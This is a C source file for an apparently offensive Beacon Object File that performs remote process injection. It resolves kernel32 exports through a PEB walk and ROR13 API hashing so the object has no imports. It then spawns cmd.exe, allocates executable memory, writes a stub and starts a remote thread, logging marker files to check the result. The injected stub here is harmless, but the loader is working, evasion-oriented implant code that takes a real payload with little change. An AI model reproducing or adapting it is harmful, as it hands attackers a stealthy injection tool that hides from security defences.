/* P4 inject BOF: self-contained process injection, ZERO imports.
 *
 * Everything resolves at runtime via a PEB walk + ROR13 hashes, so the
 * object has no UNDEF externals: boff.cpp's admission classifies it as a
 * Win32-only BOF and (with GARGLE_NOOK on) it runs INSIDE the masked
 * window - beacon image and tracked heap ciphertext while the injection
 * executes.
 *
 * Triage: go() first writes TWO probe markers - one with a .data path,
 * one with a stack-built path - which splits "the packer never carried
 * our .data" from every other failure. The real marker then reports the
 * remote thread exit code; 0x2A proves our bytes executed in the victim.
 *
 * Single external function (all helpers forceinline): one .text section,
 * the only shape proven through the stock packer. */
#include <windows.h>
#include <intrin.h>

#define BW_H_CREATEPROCESSA       0x16B3FE72UL
#define BW_H_VIRTUALALLOCEX       0x6E1A959CUL
#define BW_H_WRITEPROCESSMEMORY   0xD83D6AA1UL
#define BW_H_CREATEREMOTETHREAD   0x72BD9CDDUL
#define BW_H_WAITFORSINGLEOBJECT  0xCE05D9ADUL
#define BW_H_GETEXITCODETHREAD    0x1B3F95F9UL
#define BW_H_TERMINATEPROCESS     0x78B5B983UL
#define BW_H_CREATEFILEA          0x7C0017A5UL
#define BW_H_WRITEFILE            0xE80A791FUL
#define BW_H_CLOSEHANDLE          0x0FFD97FBUL

typedef struct {
	DWORD cb; LPSTR lpReserved; LPSTR lpDesktop; LPSTR lpTitle;
	DWORD dwX, dwY, dwXSize, dwYSize, dwXCountChars, dwYCountChars;
	DWORD dwFillAttribute, dwFlags; WORD wShowWindow, cbReserved2;
	LPBYTE lpReserved2; HANDLE hStdInput, hStdOutput, hStdError;
} BW_STARTUPINFOA;
typedef struct {
	HANDLE hProcess, hThread; DWORD dwProcessId, dwThreadId;
} BW_PROCESS_INFORMATION;

typedef BOOL    (WINAPI *BW_CREATEPROCESSA)(LPCSTR, LPSTR, void *, void *, BOOL, DWORD, void *, LPCSTR, BW_STARTUPINFOA *, BW_PROCESS_INFORMATION *);
typedef LPVOID  (WINAPI *BW_VIRTUALALLOCEX)(HANDLE, LPVOID, SIZE_T, DWORD, DWORD);
typedef BOOL    (WINAPI *BW_WRITEPROCESSMEMORY)(HANDLE, LPVOID, LPCVOID, SIZE_T, SIZE_T *);
typedef HANDLE  (WINAPI *BW_CREATEREMOTETHREAD)(HANDLE, void *, SIZE_T, LPTHREAD_START_ROUTINE, LPVOID, DWORD, LPDWORD);
typedef DWORD   (WINAPI *BW_WAITFORSINGLEOBJECT)(HANDLE, DWORD);
typedef BOOL    (WINAPI *BW_GETEXITCODETHREAD)(HANDLE, LPDWORD);
typedef BOOL    (WINAPI *BW_TERMINATEPROCESS)(HANDLE, UINT);
typedef HANDLE  (WINAPI *BW_CREATEFILEA)(LPCSTR, DWORD, DWORD, void *, DWORD, DWORD, HANDLE);
typedef BOOL    (WINAPI *BW_WRITEFILE)(HANDLE, LPCVOID, DWORD, LPDWORD, void *);
typedef BOOL    (WINAPI *BW_CLOSEHANDLE)(HANDLE);

/* .data residents (the transport under test) */
static char g_cmdline[] = "cmd.exe /c ping -n 30 127.0.0.1";
static char g_marker_path[] = "C:\\Users\\Public\\bw_inject_marker.txt";
static char g_data_probe[] = "C:\\Users\\Public\\bw_probe_data.txt";
static char g_msg_ok[] = "INJECT rc=0x2a (remote stub executed)";
static char g_msg_fail[] = "INJECT FAIL";

/* mov eax, 0x2A ; ret - the injected stub */
static const unsigned char g_stub[6] = { 0xB8, 0x2A, 0x00, 0x00, 0x00, 0xC3 };

static __forceinline unsigned long bw_hash(const char *s)
{
	unsigned long h = 0;
	while (*s) { h = (h >> 13) | (h << 19); h += (unsigned char)*s++; }
	return h;
}

static __forceinline int bw_wieq(const unsigned short *a, const unsigned short *b)
{
	while (*a && *b) {
		unsigned short ca = *a, cb = *b;
		if (ca >= 'A' && ca <= 'Z') ca += 0x20;
		if (cb >= 'A' && cb <= 'Z') cb += 0x20;
		if (ca != cb) return 0;
		a++; b++;
	}
	return *a == *b;
}

static __forceinline void *bw_kernel32(void)
{
	unsigned long long peb = __readgsqword(0x60);
	unsigned long long ldr = *(unsigned long long *)(peb + 0x18);
	void *head = (void *)(*(unsigned long long *)(ldr + 0x10));
	unsigned short kname[16];
	unsigned __int64 *kq = (unsigned __int64 *)kname;
	void *cur;

	kq[0] = 0x006E00720065006BULL; /* k e r n */
	kq[1] = 0x00320033006C0065ULL; /* e l 3 2 */
	kq[2] = 0x006C006C0064002EULL; /* . d l l */
	kq[3] = 0;
	cur = *(void **)head;
	while (cur != head) {
		void *base = *(void **)((unsigned char *)cur + 0x30);
		unsigned short *name = *(unsigned short **)((unsigned char *)cur + 0x60);
		if (base != NULL && name != NULL && bw_wieq(name, kname))
			return base;
		cur = *(void **)cur;
	}
	return NULL;
}

static __forceinline void *bw_exp(void *k32, unsigned long want)
{
	unsigned char *b = (unsigned char *)k32;
	DWORD lf = *(DWORD *)(b + 0x3C);
	unsigned char *nth = b + lf;
	DWORD exp_rva = *(DWORD *)(nth + 0x88);
	DWORD exp_sz = *(DWORD *)(nth + 0x8C);
	unsigned char *ed = b + exp_rva;
	DWORD *names = (DWORD *)(b + *(DWORD *)(ed + 0x20));
	WORD  *ords  = (WORD  *)(b + *(DWORD *)(ed + 0x24));
	DWORD *funcs = (DWORD *)(b + *(DWORD *)(ed + 0x1C));
	DWORD n = *(DWORD *)(ed + 0x18), i;

	if (exp_rva == 0)
		return NULL;
	for (i = 0; i < n; i++) {
		if (bw_hash((const char *)(b + names[i])) == want) {
			DWORD frva = funcs[ords[i]];
			if (frva >= exp_rva && frva < exp_rva + exp_sz)
				return NULL;
			return b + frva;
		}
	}
	return NULL;
}

static __forceinline void bw_put_msg(BW_CREATEFILEA pCFA, BW_WRITEFILE pWF,
                                     BW_CLOSEHANDLE pCH, char *path, char *msg)
{
	HANDLE f = pCFA(path, GENERIC_WRITE, 0, NULL, CREATE_ALWAYS,
	                FILE_ATTRIBUTE_NORMAL, NULL);
	DWORD written = 0, len;
	if (f == INVALID_HANDLE_VALUE)
		return;
	for (len = 0; msg[len]; len++)
		;
	pWF(f, msg, len, &written, NULL);
	pCH(f);
}

void go(char *args, int len)
{
	void *k32 = bw_kernel32();
	BW_CREATEFILEA  pCFA;
	BW_WRITEFILE    pWF;
	BW_CLOSEHANDLE  pCH;
	BW_CREATEPROCESSA pCP;
	BW_VIRTUALALLOCEX pVAE;
	BW_WRITEPROCESSMEMORY pWPM;
	BW_CREATEREMOTETHREAD pCRT;
	BW_WAITFORSINGLEOBJECT pWFS;
	BW_GETEXITCODETHREAD pGEC;
	BW_TERMINATEPROCESS pTP;
	BW_STARTUPINFOA si;
	BW_PROCESS_INFORMATION pi;
	char stack_path[40];
	void *remote;
	SIZE_T written = 0;
	HANDLE th = NULL;
	DWORD rc = 0;
	int ok = 0, i;

	(void)args; (void)len;
	if (k32 == NULL)
		return;
	pCFA = (BW_CREATEFILEA)bw_exp(k32, BW_H_CREATEFILEA);
	pWF  = (BW_WRITEFILE)bw_exp(k32, BW_H_WRITEFILE);
	pCH  = (BW_CLOSEHANDLE)bw_exp(k32, BW_H_CLOSEHANDLE);
	pCP  = (BW_CREATEPROCESSA)bw_exp(k32, BW_H_CREATEPROCESSA);
	pVAE = (BW_VIRTUALALLOCEX)bw_exp(k32, BW_H_VIRTUALALLOCEX);
	pWPM = (BW_WRITEPROCESSMEMORY)bw_exp(k32, BW_H_WRITEPROCESSMEMORY);
	pCRT = (BW_CREATEREMOTETHREAD)bw_exp(k32, BW_H_CREATEREMOTETHREAD);
	pWFS = (BW_WAITFORSINGLEOBJECT)bw_exp(k32, BW_H_WAITFORSINGLEOBJECT);
	pGEC = (BW_GETEXITCODETHREAD)bw_exp(k32, BW_H_GETEXITCODETHREAD);
	pTP  = (BW_TERMINATEPROCESS)bw_exp(k32, BW_H_TERMINATEPROCESS);
	if (!pCFA || !pWF || !pCH || !pCP || !pVAE || !pWPM || !pCRT ||
	    !pWFS || !pGEC || !pTP)
		return;

	/* probe A: .data path + .data message */
	bw_put_msg(pCFA, pWF, pCH, g_data_probe, "data-ok");
	/* probe B: stack-built path (immediates, zero .data dependency) */
	for (i = 0; i < 40; i++) stack_path[i] = 0;
	stack_path[0]='C'; stack_path[1]=':'; stack_path[2]='\\'; stack_path[3]='U';
	stack_path[4]='s'; stack_path[5]='e'; stack_path[6]='r'; stack_path[7]='s';
	stack_path[8]='\\'; stack_path[9]='P'; stack_path[10]='u'; stack_path[11]='b';
	stack_path[12]='l'; stack_path[13]='i'; stack_path[14]='c'; stack_path[15]='\\';
	stack_path[16]='b'; stack_path[17]='w'; stack_path[18]='_'; stack_path[19]='p';
	stack_path[20]='r'; stack_path[21]='o'; stack_path[22]='b'; stack_path[23]='e';
	stack_path[24]='_'; stack_path[25]='s'; stack_path[26]='t'; stack_path[27]='a';
	stack_path[28]='c'; stack_path[29]='k'; stack_path[30]='.'; stack_path[31]='t';
	stack_path[32]='x'; stack_path[33]='t'; stack_path[34]=0;
	bw_put_msg(pCFA, pWF, pCH, stack_path, "stack-ok");

	si.cb = 0; si.lpReserved = 0; si.lpDesktop = 0; si.lpTitle = 0;
	si.dwX = 0; si.dwY = 0; si.dwXSize = 0; si.dwYSize = 0;
	si.dwXCountChars = 0; si.dwYCountChars = 0; si.dwFillAttribute = 0;
	si.dwFlags = 0; si.wShowWindow = 0; si.cbReserved2 = 0;
	si.lpReserved2 = 0; si.hStdInput = 0; si.hStdOutput = 0; si.hStdError = 0;
	si.cb = sizeof(BW_STARTUPINFOA);
	pi.hProcess = 0; pi.hThread = 0; pi.dwProcessId = 0; pi.dwThreadId = 0;

	if (!pCP(NULL, g_cmdline, NULL, NULL, FALSE, 0x08000000, NULL, NULL, &si, &pi))
		return;
	remote = pVAE(pi.hProcess, NULL, 0x1000, 0x3000, 0x20 /* PAGE_EXECUTE_READ */);
	if (remote != NULL && pWPM(pi.hProcess, remote, g_stub, sizeof(g_stub), &written)) {
		th = pCRT(pi.hProcess, NULL, 0, (LPTHREAD_START_ROUTINE)remote, NULL, 0, NULL);
		if (th != NULL) {
			pWFS(th, 10000);
			if (pGEC(th, &rc) && rc == 0x2A)
				ok = 1;
		}
	}
	bw_put_msg(pCFA, pWF, pCH, g_marker_path, ok ? g_msg_ok : g_msg_fail);

	if (th != NULL) pCH(th);
	if (pi.hProcess != NULL) { pTP(pi.hProcess, 0); pCH(pi.hProcess); }
	if (pi.hThread != NULL) pCH(pi.hThread);
}
